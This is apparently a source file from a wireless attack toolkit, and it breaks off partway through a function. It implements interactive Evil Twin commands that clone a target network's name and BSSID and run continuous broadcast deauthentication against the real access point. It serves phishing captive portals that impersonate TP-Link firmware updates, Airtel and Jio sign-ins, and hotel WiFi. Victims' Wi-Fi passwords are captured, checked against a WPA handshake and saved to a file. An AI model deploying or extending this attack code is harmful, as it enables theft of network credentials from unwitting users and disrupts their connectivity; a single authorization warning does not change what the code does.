import asyncio
import glob
import ipaddress
import os
import re
import shutil
import socket
import time
from datetime import datetime
from swcli.repl.palette import Command, CommandPalette
from swcli.repl.prompts import prompt_text, prompt_mac, prompt_channel, prompt_confirm, prompt_choice
from swcli.repl.session_ui import auto_fill_prompt
from sidewinder.attacks.evil_twin import EvilTwinEngine
from sidewinder.attacks.captive_portal import lookup_manufacturer
from sidewinder.attacks.wps import WPSEngine
from sidewinder.core.attack import AttackConfig
from sidewinder.core.capture import capture_deauth, validate_handshake
from sidewinder.core.paths import attack_prefix, passwords_dir, output_dir
from sidewinder.core.subprocess_mgr import get_manager
from rich.live import Live
from rich.console import Group
from rich.panel import Panel
from rich.align import Align
from rich.table import Table
from rich.text import Text
from rich import box
from swcli.repl.renderer import build_handshake_progress_panel, console, print_success, print_error, print_info, print_warning


async def _select_monitor_iface(repl):
    from sidewinder.core.adapter import list_interfaces, get_interface_mode, detect_adapter

    monitor_ifaces = []
    for iface_name in list_interfaces():
        if get_interface_mode(iface_name) == "monitor":
            chip = await detect_adapter(iface_name)
            chip_str = f" ({chip.chipset})" if (chip and chip.chipset) else ""
            monitor_ifaces.append((iface_name, chip_str))

    if not monitor_ifaces:
        print_error("No monitor interfaces found. Run /monitor first.")
        return None

    if len(monitor_ifaces) == 1:
        iface = monitor_ifaces[0][0]
        repl.print(f"  Using monitor interface: [cyan]{iface}[/cyan]{monitor_ifaces[0][1]}")
        return iface

    choices = [f"{name}{chip}" for name, chip in monitor_ifaces]
    res = prompt_choice("Select monitor interface", choices)
    if res.cancelled:
        return None
    return res.value.split(" ")[0]


def _target_label(net):
    flags = []
    if net.wps:
        flags.append("WPS")
    if net.eapol:
        flags.append("EAPOL")
    flags_text = f" [{', '.join(flags)}]" if flags else ""
    return f"{net.display_name()} ({net.bssid}) - Ch {net.channel} [signal: {net.signal} dBm]{flags_text}"


def _target_summary(title, rows):
    table = Table.grid(padding=(0, 2))
    table.add_column(style="cyan", no_wrap=True)
    table.add_column(style="white")
    for key, value in rows:
        table.add_row(key, str(value))
    return Panel(table, title=title, border_style="bright_blue", box=box.ROUNDED, padding=(0, 1))


async def _select_network_target(repl, *, purpose, wps_only=False):
    selected = getattr(repl.session, "selected_target", None)
    scan_results = list(repl.session.scan_results or [])

    choices = []
    target_map = {}
    if selected:
        label = f"Use active target: {_target_label(selected)}"
        choices.append(label)
        target_map[label] = selected

    if wps_only:
        candidates = sorted(scan_results, key=lambda n: (not n.wps, n.display_name().lower()))
    else:
        candidates = scan_results
    for net in candidates:
        if selected and net.bssid.upper() == selected.bssid.upper():
            continue
        label = _target_label(net)
        choices.append(label)
        target_map[label] = net

    choices.append("Enter target manually")

    if len(choices) > 1:
        res = prompt_choice(f"Select {purpose} target", choices)
        if res.cancelled:
            return None
        if res.value != "Enter target manually":
            net = target_map[res.value]
            repl.session.selected_target = net
            repl.session.last_bssid = net.bssid
            repl.session.last_channel = net.channel
            return net

    bssid_res = prompt_mac(*auto_fill_prompt(repl.session, "bssid", "Target BSSID"))
    if bssid_res.cancelled:
        return None
    ch = repl.session.get_channel_for_bssid(bssid_res.value)
    ch_res = prompt_channel("Channel", default=ch or repl.session.last_channel or 6)
    if ch_res.cancelled:
        return None
    return type("ManualTarget", (), {
        "bssid": bssid_res.value,
        "channel": ch_res.value,
        "signal": -1,
        "wps": False,
        "eapol": False,
        "display_name": lambda self: "[MANUAL]",
    })()


def _attack_progress_panel(title, target_rows, logs, elapsed):
    table = Table.grid(padding=(0, 2))
    table.add_column(style="cyan", no_wrap=True)
    table.add_column(style="white")
    for key, value in target_rows:
        table.add_row(key, str(value))

    log_text = Text()
    if logs:
        for line in logs[-8:]:
            log_text.append(line[-120:] + "\n", style="dim")
    else:
        log_text.append("Waiting for tool output...", style="dim")

    status = Text()
    status.append("Elapsed ", style="dim")
    status.append(f"{int(elapsed)}s", style="bold white")
    status.append("  Press Ctrl+C to stop", style="dim")

    return Panel(
        Group(table, Text(""), log_text, Text(""), status),
        title=title,
        border_style="bright_cyan",
        box=box.ROUNDED,
        padding=(0, 1),
    )


def _prompt_int(message, default, minimum, maximum):
    def validate(value):
        try:
            parsed = int(value)
        except ValueError:
            return False
        return minimum <= parsed <= maximum

    res = prompt_text(message, str(default), validate, f"Enter a number from {minimum} to {maximum}")
    if res.cancelled:
        return res
    return type(res)(int(res.value))


def _prompt_ip(message, default):
    def validate(value):
        try:
            ipaddress.IPv4Address(value)
            return True
        except ValueError:
            return False

    return prompt_text(message, default, validate, "Enter a valid IPv4 address")


def _tcp_port_available(port: int) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", port))
        return True
    except OSError:
        return False


def _portal_network_warnings(port: int) -> list[str]:
    warnings = []
    running_as_root = os.name == "nt" or not hasattr(os, "geteuid") or os.geteuid() == 0
    port_80_free = _tcp_port_available(80)

    if port == 80:
        if not running_as_root:
            warnings.append("Portal port 80 usually requires sudo/root privileges.")
        if not port_80_free:
            warnings.append("Port 80 is already in use; the portal will not bind until that service is stopped.")
    else:
        warnings.append(f"Portal port {port} requires firewall redirection from client HTTP port 80.")
        if not running_as_root:
            warnings.append("Firewall redirection usually requires sudo/root privileges.")
        if shutil.which("iptables") is None and shutil.which("nft") is None:
            warnings.append("Neither iptables nor nft is available; Android captive probes may not reach the portal.")
        if not port_80_free:
            warnings.append("Port 80 is already in use locally; relying on DNAT instead of direct port 80 bind.")

    if shutil.which("dnsmasq") is None:
        warnings.append("dnsmasq is missing; clients may associate but fail DHCP/DNS captive portal discovery.")
    return warnings


def _prompt_internet_forwarding(default_enabled=False):
    conf = prompt_confirm("Provide internet access to clients? (Requires upstream connection)", default=default_enabled)
    if conf.cancelled or not conf.value:
        return None
        
    try:
        import os
        ifaces = os.listdir('/sys/class/net/')
        ifaces = [i for i in ifaces if i != 'lo' and not i.startswith('at') and not i.startswith('mon')]
        ifaces.sort()
    except Exception:
        ifaces = ['eth0', 'wlan0', 'wlan1']
        
    res = prompt_choice("Select upstream internet interface", ifaces)
    if res.cancelled:
        return None
    return res.value


def _prompt_evil_twin_network_settings():
    tap_iface = "at0"
    gateway_ip = "10.0.0.1"
    cidr_prefix = 24
    dhcp_start = "10.0.0.10"
    dhcp_end = "10.0.0.100"
    portal_port = 8080

    advanced_res = prompt_confirm("Customize client network settings?", default=False)
    if advanced_res.cancelled:
        return None
    if advanced_res.value:
        tap_res = prompt_text("airbase-ng tap interface", default=tap_iface)
        if tap_res.cancelled:
            return None
        gw_res = _prompt_ip("Gateway IP", gateway_ip)
        if gw_res.cancelled:
            return None
        cidr_res = _prompt_int("CIDR prefix", cidr_prefix, 1, 32)
        if cidr_res.cancelled:
            return None
        dhcp_start_res = _prompt_ip("DHCP range start", dhcp_start)
        if dhcp_start_res.cancelled:
            return None
        dhcp_end_res = _prompt_ip("DHCP range end", dhcp_end)
        if dhcp_end_res.cancelled:
            return None
        port_res = _prompt_int("Portal port", portal_port, 1, 65535)
        if port_res.cancelled:
            return None
        tap_iface = tap_res.value
        gateway_ip = gw_res.value
        cidr_prefix = cidr_res.value
        dhcp_start = dhcp_start_res.value
        dhcp_end = dhcp_end_res.value
        portal_port = port_res.value

    try:
        EvilTwinEngine(
            tap_iface=tap_iface,
            gateway_ip=gateway_ip,
            cidr_prefix=cidr_prefix,
            dhcp_start=dhcp_start,
            dhcp_end=dhcp_end,
            portal_port=portal_port,
        )._validate_network_config()
    except ValueError as e:
        print_error(str(e))
        return None

    for warning in _portal_network_warnings(portal_port):
        print_warning(warning)

    return tap_iface, gateway_ip, cidr_prefix, dhcp_start, dhcp_end, portal_port


def _evil_twin_phase(logs):
    joined = "\n".join(logs[-80:]).lower()
    if "timed out" in joined:
        return "Timed out"
    if "portal]" in joined or "captive portal ready" in joined or "captive portal started" in joined or "http server listening" in joined:
        return "Portal active"
    if "dhcp ready" in joined or "dhcp lease" in joined:
        return "DHCP active"
    if "preparing client network" in joined:
        return "Configuring clients"
    if "initializing rogue ap" in joined:
        return "Broadcasting AP"
    if "preflight" in joined:
        return "Preflight"
    return "Starting"


def _evil_twin_portal_stats(engine):
    portal = getattr(engine, "_captive_portal", None)
    return getattr(portal, "stats", None) if portal else None


def _evil_twin_portal_health(engine):
    portal = getattr(engine, "_captive_portal", None)
    return getattr(portal, "health", None) if portal else None


def _evil_twin_runtime_status(logs, portal_stats, portal_health=None):
    joined = "\n".join(logs[-120:]).lower()
    if portal_health and getattr(portal_health, "http_bound", False):
        bind_status = "active"
    elif portal_health and any("HTTP bind failed" in f for f in getattr(portal_health, "failures", [])):
        bind_status = "failed"
    elif "failed to start http server" in joined or "could not start captive portal" in joined:
        bind_status = "failed"
    elif "http server listening" in joined or "captive portal started" in joined or "captive portal ready" in joined:
        bind_status = "active"
    else:
        bind_status = "pending"

    if portal_health and getattr(portal_health, "firewall_redirect_active", False):
        redirect_status = "active"
    elif portal_health and getattr(portal_health, "firewall_active", False):
        redirect_status = "partial"
    elif (
        "firewall rules applied (0 rules)" in joined
        or "neither iptables nor nft" in joined
        or "firewall rule failed" in joined
        or "nftables rules failed" in joined
    ):
        redirect_status = "failed"
    elif "nftables rules applied" in joined or re.search(r"firewall rules applied \([1-9]\d* rules\)", joined):
        redirect_status = "active"
    else:
        redirect_status = "pending"

    if portal_health and getattr(portal_health, "dns_active", False):
        dns_status = "active"
    elif "dnsmasq exited" in joined or "dnsmasq not found" in joined:
        dns_status = "failed"
    elif "dns capture active" in joined or "dns blackhole active" in joined or "dhcp ready" in joined:
        dns_status = "active"
    else:
        dns_status = "pending"

    probe = "none"
    if portal_stats and portal_stats.portal_requests:
        probe_paths = {"/generate_204", "/gen_204", "/hotspot-detect.html", "/ncsi.txt", "/connecttest.txt"}
        for request in reversed(portal_stats.portal_requests):
            path = request.get("path", "")
            if path in probe_paths:
                probe = path
                break
        if probe == "none":
            probe = portal_stats.portal_requests[-1].get("path", "unknown")

    return bind_status, redirect_status, dns_status, probe


def _evil_twin_progress_panel(engine, target_rows, logs, elapsed, portal_mode):
    overview = Table.grid(padding=(0, 2))
    overview.add_column(style="cyan", no_wrap=True)
    overview.add_column(style="white")
    for key, value in target_rows:
        overview.add_row(key, str(value))

    phase = _evil_twin_phase(logs)
    stats = getattr(engine, "stats", None)
    portal_stats = _evil_twin_portal_stats(engine)
    portal_health = _evil_twin_portal_health(engine)
    live_associated = len(stats.live_clients) if stats else 0
    total_associated = len(stats.associated_clients) if stats else 0
    leases = len(stats.dhcp_leases) if stats else 0
    portal_hits = portal_stats.portal_hits if portal_stats else (stats.portal_hits if stats else 0)
    password_attempts = len(portal_stats.password_attempts) if portal_stats else 0
    bind_status, redirect_status, dns_status, probe = _evil_twin_runtime_status(logs, portal_stats, portal_health)

    telemetry = Table.grid(padding=(0, 2))
    telemetry.add_column(style="cyan", no_wrap=True)
    telemetry.add_column(style="white")
    telemetry.add_column(style="cyan", no_wrap=True)
    telemetry.add_column(style="white")
    telemetry.add_row("Phase", phase, "Elapsed", f"{int(elapsed)}s")
    telemetry.add_row("Live Clients", str(live_associated), "Total Seen", str(total_associated))
    telemetry.add_row("DHCP Leases", str(leases), "Portal Hits", str(portal_hits))
    telemetry.add_row("HTTP bind", bind_status, "Port 80 redirect", redirect_status)
    telemetry.add_row("DNS/DHCP", dns_status, "Last probe", probe)
    if portal_mode == "password":
        handshake_file = getattr(getattr(engine, "_captive_portal", None), "config", None)
        handshake_file = getattr(handshake_file, "handshake_file", None)
        if portal_stats and portal_stats.password_found:
            verified_display = f"[bold green]{portal_stats.captured_password}[/bold green]"
        elif not handshake_file and portal_stats and portal_stats.password_attempts:
            pw = portal_stats.password_attempts[-1].get("password", "")
            verified_display = f"[bold yellow]{pw}[/bold yellow] (unverified)"
        else:
            verified_display = "[dim]waiting...[/dim]"
        telemetry.add_row("Passwords Caught", str(password_attempts), "Verified Status", verified_display)

    events = Text()
    signal_styles = [
        (re.compile(r"^\[\+\]|ready|associated|lease", re.I), "green"),
        (re.compile(r"^\[!\]|missing|could not|failed|exited", re.I), "yellow"),
        (re.compile(r"^\[portal\]", re.I), "bright_cyan"),
    ]
    if logs:
        for line in logs[-9:]:
            style = "dim"
            for pattern, candidate in signal_styles:
                if pattern.search(line):
                    style = candidate
                    break
            events.append(line[-120:] + "\n", style=style)
    else:
        events.append("Waiting for AP startup...", style="dim")

    footer = Text()
    footer.append("Press Ctrl+C to stop and clean up AP/DHCP/portal", style="dim")

    return Panel(
        Group(overview, Text(""), telemetry, Text(""), events, Text(""), footer),
        title="Evil Twin Lab Session",
        border_style="bright_cyan",
        box=box.ROUNDED,
        padding=(0, 1),
    )




async def cmd_evil_twin_pass(repl):
    """Evil Twin Pass - Credential capture with password portal.

    Flow:
      1. Select interface (check monitor mode)
      2. Target from /scan (already loaded)
      3. ESSID same or different
      4. Clone target BSSID Y/N
      5. Client network settings and preflight
      6. Portal type selection
      7. Password verification Y/N
         → Auto-detect EAPOL from session
         → If no EAPOL, load .cap files from directory
      8. Serve portal, record passwords, save with metadata
    """
    # --- 1. Select interface (check monitor mode) ---
    iface = await _select_monitor_iface(repl)
    if not iface:
        return

    # --- 2. Target from /scan (already loaded) ---
    target = await _select_network_target(repl, purpose="Evil Twin Pass")
    if not target:
        return

    # Check for multi-band target
    scan_results = getattr(repl.session, "scan_results", [])
    if target and target.essid and target.display_name() not in ("[HIDDEN]", "[MANUAL]"):
        target_name = target.display_name().strip()
        related = [n for n in scan_results if n.bssid != target.bssid and n.display_name().strip() == target_name and n.channel != target.channel]
        if related:
            print_warning("[bold yellow][WARNING] Multi-Band Target Detected![/bold yellow]")
            repl.print(f"  Target ESSID '{target.display_name()}' spans channels: {target.channel} and {', '.join(str(n.channel) for n in related)}")
            repl.print("  [yellow]Clients may roam to the 5GHz band when deauthenticated from this 2.4GHz Rogue AP.[/yellow]")
            repl.print("  [yellow]For best results, you may want to assign a secondary adapter to deauth the 5GHz band.[/yellow]\n")

    # --- 3. ESSID same or different ---
    default_essid = "" if target.display_name() in ("[HIDDEN]", "[MANUAL]") else target.display_name()
    essid_res = prompt_text("ESSID to broadcast (same as target or custom)", default=default_essid)
    if essid_res.cancelled:
        return
    if not essid_res.value.strip():
        print_error("ESSID is required.")
        return
    essid = essid_res.value.strip()

    # --- 4. Clone target BSSID Y/N ---
    clone_bssid = ""
    if getattr(target, "bssid", ""):
        clone_res = prompt_confirm("Clone target BSSID in rogue AP beacon?")
        if clone_res.cancelled:
            return
        if clone_res.value:
            clone_bssid = target.bssid

    # --- 5. Client network settings and preflight ---
    network_settings = _prompt_evil_twin_network_settings()
    if network_settings is None:
        return
    tap_iface, gateway_ip, cidr_prefix, dhcp_start, dhcp_end, portal_port = network_settings

    # --- 6. Portal type selection ---
    portal_choices = [
        "TP-Link Router Admin (firmware update prompt)",
        "ISP Portal - Airtel ( WiFi sign-in)",
        "ISP Portal - Jio ( WiFi sign-in)",
        "Hotel/Airport WiFi (guest captive portal)",
        "Router Manufacturer Update (auto-detect from BSSID)",
    ]
    portal_res = prompt_choice("Portal type", portal_choices)
    if portal_res.cancelled:
        return
    portal_type = portal_res.value
    portal_variant = {
        "TP-Link Router Admin (firmware update prompt)": "tplink",
        "ISP Portal - Airtel ( WiFi sign-in)": "airtel",
        "ISP Portal - Jio ( WiFi sign-in)": "jio",
        "Hotel/Airport WiFi (guest captive portal)": "hotel",
        "Router Manufacturer Update (auto-detect from BSSID)": "generic_router",
    }[portal_type]

    # --- 6b. Determine router manufacturer from BSSID ---
    router_manufacturer = ""
    if portal_variant == "generic_router":
        target_bssid = getattr(target, "bssid", "") or ""
        router_manufacturer = lookup_manufacturer(target_bssid)
        if router_manufacturer:
            print_info(f"Detected manufacturer: {router_manufacturer} (from OUI {target_bssid[:8]})")
        else:
            print_warning(f"Could not identify manufacturer from BSSID {target_bssid} — using generic name.")
            router_manufacturer = "Router"

    # --- 7. Password verification Y/N ---
    handshake_file = None
    verify_res = prompt_confirm("Verify password against handshake?", default=True)
    if verify_res.cancelled:
        return

    if verify_res.value:
        # Auto-detect EAPOL from session
        last_cap = getattr(repl.session, "last_cap_file", "")
        session_captures = list(getattr(repl.session, "captures", []))

        # Check last_cap_file first
        found_eapol = False
        if last_cap and os.path.isfile(last_cap):
            validation = validate_handshake(last_cap)
            if validation and validation.eapol_count > 0:
                print_info(f"EAPOL detected in last capture: {last_cap} ({validation.eapol_count} frames)")
                use_res = prompt_confirm("Use this handshake?", default=True)
                if use_res.cancelled:
                    return
                if use_res.value:
                    handshake_file = last_cap
                    found_eapol = True

        # Check other session captures
        if not found_eapol:
            for cap_path in reversed(session_captures):
                if cap_path == last_cap:
                    continue
                if os.path.isfile(cap_path):
                    validation = validate_handshake(cap_path)
                    if validation and validation.eapol_count > 0:
                        print_info(f"EAPOL found: {cap_path} ({validation.eapol_count} frames)")
                        use_res = prompt_confirm("Use this handshake?", default=True)
                        if use_res.cancelled:
                            return
                        if use_res.value:
                            handshake_file = cap_path
                            found_eapol = True
                            break

        # No EAPOL in session — load from directory
        if not found_eapol:
            print_info("No EAPOL found in session captures.")
            from sidewinder.core.config import SidewinderConfig
            cap_dir = SidewinderConfig.load().capture_dir
            cap_files = glob.glob(os.path.join(cap_dir, "*.cap"))

            if cap_files:
                # Validate each and show only ones with EAPOL
                valid_caps = []
                for cf in cap_files:
                    v = validate_handshake(cf)
                    if v and v.eapol_count > 0:
                        valid_caps.append((cf, v))

                if valid_caps:
                    print_info(f"Found {len(valid_caps)} .cap file(s) with EAPOL:")
                    cap_choices = [f"{os.path.basename(cf)} ({v.eapol_count} EAPOL)" for cf, v in valid_caps]
                    cap_choices.append("Enter path manually")
                    cap_res = prompt_choice("Select handshake file", cap_choices)
                    if cap_res.cancelled:
                        return
                    if "Enter path" in cap_res.value:
                        manual_res = prompt_text("Path to .cap file")
                        if manual_res.cancelled or not manual_res.value.strip():
                            return
                        handshake_file = manual_res.value.strip()
                    else:
                        idx = cap_choices.index(cap_res.value)
                        handshake_file = valid_caps[idx][0]

                    # Validate selected file
                    if handshake_file and os.path.isfile(handshake_file):
                        v = validate_handshake(handshake_file)
                        if v and v.eapol_count > 0:
                            repl.session.last_cap_file = handshake_file
                            print_success(f"Handshake loaded ({v.eapol_count} EAPOL)")
                        else:
                            print_warning(f"No valid EAPOL in {handshake_file}")
                            handshake_file = None
                    else:
                        print_error(f"File not found: {handshake_file}")
                        handshake_file = None
                else:
                    print_warning("No .cap files with valid EAPOL found in capture directory.")
            else:
                print_warning("No .cap files found in capture directory.")

            if not handshake_file:
                manual_res = prompt_text("Enter .cap file path manually (or leave empty to skip)")
                if not manual_res.cancelled and manual_res.value.strip():
                    handshake_file = manual_res.value.strip()
                    if not os.path.isfile(handshake_file):
                        print_error(f"File not found: {handshake_file}")
                        handshake_file = None

            if not handshake_file:
                print_warning("Continuing without handshake. Password validation is disabled.")
    else:
        print_info("Password verification disabled. All attempts will be logged but not validated.")

    # --- 8. Continuous deauth (optional) ---
    enable_deauth = False
    deauth_interval = 30.0
    deauth_burst = 5
    deauth_client = "FF:FF:FF:FF:FF:FF"
    deauth_iface = None
    if getattr(target, "bssid", ""):
        deauth_res = prompt_confirm("Run continuous deauth against target AP?", default=False)
        if deauth_res.cancelled:
            return
        enable_deauth = deauth_res.value
        if enable_deauth:
            clients = repl.session.clients
            associated = [c for c in clients if c.bssid.upper() == target.bssid.upper()] if clients else []
            
            if associated:
                cli_choices = ["All Stations (Broadcast)"]
                cli_map = {}
                for c in associated:
                    label = f"{c.mac} [signal: {c.signal} dBm]"
                    cli_choices.append(label)
                    cli_map[label] = c.mac
                cli_choices.append("Enter Client MAC manually")
                
                cli_res = prompt_choice("Target client for deauth", cli_choices)
                if cli_res.cancelled:
                    return
                    
                if cli_res.value == "Enter Client MAC manually":
                    mac_res = prompt_mac("Client MAC", default="FF:FF:FF:FF:FF:FF", allow_broadcast=True)
                    if mac_res.cancelled: return
                    deauth_client = mac_res.value
                elif cli_res.value == "All Stations (Broadcast)":
                    deauth_client = "FF:FF:FF:FF:FF:FF"
                else:
                    deauth_client = cli_map.get(cli_res.value, "FF:FF:FF:FF:FF:FF")
            else:
                mac_res = prompt_mac("Client MAC (Enter for Broadcast)", default="FF:FF:FF:FF:FF:FF", allow_broadcast=True)
                if mac_res.cancelled: return
                deauth_client = mac_res.value

            interval_res = prompt_text("Deauth burst interval (seconds)", default="30")
            if interval_res.cancelled:
                return
            try:
                deauth_interval = max(5.0, float(interval_res.value))
            except ValueError:
                deauth_interval = 30.0
            burst_res = prompt_text("Deauth frames per burst", default="5")
            if burst_res.cancelled:
                return
            try:
                deauth_burst = max(1, min(100, int(burst_res.value)))
            except ValueError:
                deauth_burst = 5

            rate_choices = {
                "Recommended (128 pps)": 128,
                "Fast (256 pps)": 256,
                "Slow (64 pps)": 64,
                "Custom...": -1,
            }
            rate_res = prompt_choice("Deauth packet rate", list(rate_choices.keys()), default=0)
            if rate_res.cancelled: return
            
            deauth_rate = rate_choices[rate_res.value]
            if deauth_rate == -1:
                custom_rate_res = prompt_text("Custom rate (packets per second)", default="128")
                if custom_rate_res.cancelled: return
                try:
                    deauth_rate = int(custom_rate_res.value)
                except ValueError:
                    deauth_rate = 128

            from sidewinder.core.adapter import list_interfaces
            all_ifaces = list_interfaces()
            if len(all_ifaces) > 1:
                choices = [f"{i} (used for portal)" if i == iface else i for i in all_ifaces]
                default_idx = 0
                for idx, i in enumerate(all_ifaces):
                    if i != iface:
                        default_idx = idx
                        break
                
                iface_res = prompt_choice("Select interface for continuous deauth", choices, default=default_idx)
                if not iface_res.cancelled:
                    idx = choices.index(iface_res.value)
                    deauth_iface = all_ifaces[idx]
                    if deauth_iface == iface:
                        deauth_iface = None

            if not deauth_iface:
                print_warning("Note: Running deauth and the rogue AP on the same Wi-Fi adapter may cause instability.")
                print_warning("If deauth fails to disconnect clients, consider using a second adapter for deauth.")

    # --- 9. Internet Forwarding ---
    internet_iface = _prompt_internet_forwarding(default_enabled=False)

    # --- Summary ---
    plan_rows = [
        ("Interface", iface),
        ("ESSID", essid),
        ("Channel", target.channel),
        ("Clone BSSID", clone_bssid or "no"),
        ("Portal type", portal_type),
        ("Handshake", handshake_file or "none (validation disabled)"),
    ]
    if enable_deauth:
        display_client = "Broadcast (All Stations)" if deauth_client == "FF:FF:FF:FF:FF:FF" else deauth_client
        plan_rows.append(("Continuous deauth", f"every {deauth_interval}s ({deauth_burst} frames @ {deauth_rate} pps)"))
        plan_rows.append(("Deauth IFace", deauth_iface or iface))
        plan_rows.append(("Deauth Target", display_client))
    else:
        plan_rows.append(("Continuous deauth", "off"))

    plan_rows.extend([
        ("Client network", f"{tap_iface} {gateway_ip}/{cidr_prefix}"),
        ("DHCP range", f"{dhcp_start} - {dhcp_end}"),
        ("Internet access", f"via {internet_iface}" if internet_iface else "off"),
        ("Portal URL", f"http://{gateway_ip}:{portal_port}/"),
    ])
    console.print(_target_summary("Evil Twin Pass Plan", plan_rows))
    print_warning("Evil Twin Pass starts a rogue AP with credential capture. Use only with authorization.")
    conf = prompt_confirm("Start Evil Twin Pass?")
    if conf.cancelled or not conf.value:
        return

    # --- Start attack ---
    engine = EvilTwinEngine(
        get_manager(),
        tap_iface=tap_iface,
        gateway_ip=gateway_ip,
        cidr_prefix=cidr_prefix,
        dhcp_start=dhcp_start,
        dhcp_end=dhcp_end,
        portal_port=portal_port,
    )
    logs = []
    start = time.monotonic()

    def on_log(line):
        logs.append(line)

    try:
        target_rows = [
            ("Interface", iface),
            ("ESSID", essid),
            ("Channel", target.channel),
            ("BSSID", clone_bssid or "generated"),
            ("Gateway", f"{gateway_ip}/{cidr_prefix}"),
            ("Handshake", handshake_file or "none"),
        ]
        if enable_deauth:
            display_client = "Broadcast (All Stations)" if deauth_client == "FF:FF:FF:FF:FF:FF" else deauth_client
            target_rows.append(("Deauth IFace", deauth_iface or iface))
            target_rows.append(("Deauth Target", display_client))

        with Live(
            _evil_twin_progress_panel(engine, target_rows, logs, 0, "password"),
            console=console,
            refresh_per_second=4,
            transient=False,
        ) as live:
            task = asyncio.create_task(engine.start_rogue_ap(
                mon_iface=iface,
                essid=essid,
                channel=target.channel,
                target_bssid=clone_bssid or None,
                on_log=on_log,
                portal_mode="password",
                portal_title=essid,
                portal_message="This network requires a password to connect.",
                handshake_file=handshake_file,
                enable_continuous_deauth=enable_deauth,
                deauth_client=deauth_client,
                deauth_interval=deauth_interval,
                deauth_count=deauth_burst,
                deauth_rate=deauth_rate,
                portal_variant=portal_variant,
                validation_bssid=getattr(target, "bssid", "") or None,
                deauth_iface=deauth_iface,
                internet_iface=internet_iface,
                router_manufacturer=router_manufacturer,
            ))
            while not task.done():
                live.update(_evil_twin_progress_panel(engine, target_rows, logs, time.monotonic() - start, "password"), refresh=True)
                
                portal_stats = _evil_twin_portal_stats(engine)
                if portal_stats and portal_stats.password_found:
                    live.update(_evil_twin_progress_panel(engine, target_rows, logs, time.monotonic() - start, "password"), refresh=True)
                    await asyncio.sleep(2.0)
                    await engine.stop()
                    break
                    
                await asyncio.sleep(0.25)
            ok = await task
            live.update(_evil_twin_progress_panel(engine, target_rows, logs, time.monotonic() - start, "password"), refresh=True)

        portal_stats = _evil_twin_portal_stats(engine)
        if portal_stats and portal_stats.password_found:
            success_panel = Panel(
                Align.center(
                    f"[bold white]🎯 TARGET COMPROMISED[/bold white]\n\n"
                    f"[bold green]Password Captured:[/bold green] [bold yellow]{portal_stats.captured_password}[/bold yellow]\n\n"
                    f"[dim]Saved to: {os.path.join(passwords_dir(), 'passwords.txt')}[/dim]"
                ),
                border_style="bold green",
                padding=(1, 2),
                expand=False
            )
            console.print("\n")
            console.print(Align.center(success_panel))
            console.print("\n")
        elif ok:
            print_success("Evil Twin Pass session ended.")
        else:
            print_warning("Evil Twin Pass stopped before completion.")

        stats = engine.stats
        summary_rows = [
            ("Total unique clients", len(stats.associated_clients)),
            ("Live clients at exit", len(stats.live_clients)),
            ("DHCP leases", len(stats.dhcp_leases)),
            ("Portal hits", portal_stats.portal_hits if portal_stats else stats.portal_hits),
        ]
        if portal_stats:
            summary_rows.append(("Password attempts", len(portal_stats.password_attempts)))
            if portal_stats.password_found:
                summary_rows.append(("Captured password", portal_stats.captured_password))
        console.print(_target_summary("Evil Twin Pass Summary", summary_rows))

    except KeyboardInterrupt:
        await engine.stop()
        repl.print("  [yellow]Evil Twin Pass stopped.[/yellow]")
        stats = engine.stats
        portal_stats = _evil_twin_portal_stats(engine)

        if portal_stats and portal_stats.password_found:
            success_panel = Panel(
                Align.center(
                    f"[bold white]🎯 TARGET COMPROMISED[/bold white]\n\n"
                    f"[bold green]Password Captured:[/bold green] [bold yellow]{portal_stats.captured_password}[/bold yellow]\n\n"
                    f"[dim]Saved to: {os.path.join(passwords_dir(), 'passwords.txt')}[/dim]"
                ),
                border_style="bold green",
                padding=(1, 2),
                expand=False
            )
            console.print("\n")
            console.print(Align.center(success_panel))
            console.print("\n")

        summary_rows = [
            ("Total unique clients", len(stats.associated_clients)),
            ("Live clients at exit", len(stats.live_clients)),
            ("DHCP leases", len(stats.dhcp_leases)),
            ("Portal hits", portal_stats.portal_hits if portal_stats else stats.portal_hits),
            ("Password attempts", len(portal_stats.password_attempts) if portal_stats else 0),
        ]
        if portal_stats and portal_stats.password_found:
            summary_rows.append(("Captured password", portal_stats.captured_password))
            
        console.print(_target_summary("Evil Twin Pass Summary", summary_rows))


async def cmd_evil_twin_simple(repl):
    """Evil Twin Simple - Open AP with metadata logging.

    Flow:
      1. Select monitor interface
      2. Select target network
      3. Choose ESSID and clone behavior
      4. Client network settings and preflight
      5. Choose notice/captive behavior
      6. Log HTTP metadata to file
      7. No deauth, no password capture
    """
    iface = await _select_monitor_iface(repl)
    if not iface:
        return

    target = await _select_network_target(repl, purpose="Evil Twin Simple")
    if not target:
        return

    default_essid = "" if target.display_name() in ("[HIDDEN]", "[MANUAL]") else target.display_name()
    essid_res = prompt_text("ESSID to broadcast", default=default_essid)
    if essid_res.cancelled:
        return
    if not essid_res.value.strip():
        print_error("ESSID is required.")
        return

    clone_bssid = ""
    if getattr(target, "bssid", ""):
        clone_res = prompt_confirm("Clone target BSSID in rogue AP beacon?")
        if clone_res.cancelled:
            return
        if clone_res.value:
            clone_bssid = target.bssid

    network_settings = _prompt_evil_twin_network_settings()
    if network_settings is None:
        return
    tap_iface, gateway_ip, cidr_prefix, dhcp_start, dhcp_end, portal_port = network_settings

    internet_iface = _prompt_internet_forwarding(default_enabled=True)

    portal_choices = [
        "Network notice - let devices complete normal connectivity checks",
        "Captive trigger - open the OS sign-in window for lab testing",
    ]
    portal_res = prompt_choice("Portal mode", portal_choices)
    if portal_res.cancelled:
        return
    portal_mode = {
        "Network notice - let devices complete normal connectivity checks": "notice",
        "Captive trigger - open the OS sign-in window for lab testing": "captive",
    }[portal_res.value]
    if portal_mode == "notice":
        print_info("Notice mode is for observing clients without forcing the Android/iOS sign-in sheet.")
    else:
        print_info("Captive trigger mode serves the lab portal on connectivity probes.")

    portal_title = essid_res.value
    portal_message = "This access point is running in an authorized wireless audit lab."
    title_res = prompt_text("Portal title", default=portal_title)
    if title_res.cancelled:
        return
    message_res = prompt_text("Portal message", default=portal_message)
    if message_res.cancelled:
        return
    portal_title = title_res.value
    portal_message = message_res.value

    # Metadata logging
    log_dir = output_dir("EvilTwinListening")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sanitized_bssid = re.sub(r'[^a-zA-Z0-9]', '', target.bssid) if getattr(target, "bssid", "") else "unknown"
    metadata_log_file = os.path.join(log_dir, f"metadata_{sanitized_bssid}_{ts}.jsonl")

